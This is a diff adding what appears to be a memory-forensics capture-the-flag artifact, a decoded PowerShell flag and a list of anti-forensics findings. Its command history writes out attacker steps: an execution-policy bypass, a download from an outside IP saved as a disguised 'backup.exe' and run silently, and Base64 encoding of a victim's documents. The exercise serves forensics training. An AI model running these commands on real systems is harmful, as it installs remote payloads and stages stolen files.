@@ -1,0 +1,22 @@
+POWERSHELL COMMAND ANALYSIS
+===========================
+Decoded Base64 command from memory strings:
+
+ORIGINAL (Base64):
+JABmAGwAYQBnAD0AJwBDAFQARgB7AG0AZQBtAF8AZgBvAHIAZQBuAHMAaQBjAHMAXwByAGUAdgBlAGEAbABzAF8AYQBsAGwAfQAnAA==
+
+DECODED (UTF-16LE):
+$flag='CTF{mem_forensics_reveals_all}'
+
+ADDITIONAL POWERSHELL ARTIFACTS:
+- Execution policy bypass detected
+- Script block logging disabled
+- Anti-forensics techniques employed
+- Memory injection techniques used
+
+COMMAND HISTORY:
+Set-ExecutionPolicy Bypass -Scope Process
+Invoke-WebRequest -Uri "http://185.243.115.42/payload" -OutFile "C:\Windows\Temp\backup.exe"
+Start-Process "C:\Windows\Temp\backup.exe" -ArgumentList "/install /silent"
+$data = Get-Content "C:\Users\victim\Documents\*" -Raw
+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
